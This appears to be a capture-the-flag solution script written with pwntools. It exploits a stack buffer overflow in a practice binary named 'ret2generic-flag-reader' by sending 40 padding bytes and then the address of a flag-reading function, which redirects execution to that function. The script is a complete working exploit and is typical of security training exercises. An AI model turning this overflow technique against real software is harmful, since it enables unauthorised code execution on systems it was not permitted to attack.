from pwn import *

e = ELF('./bin/ret2generic-flag-reader')
# p = e.process()
p = remote('localhost', 5000)

p.sendline(b"A" * 40 + p64(e.sym['super_generic_flag_reading_function_please_ret_to_me']))

p.interactive()
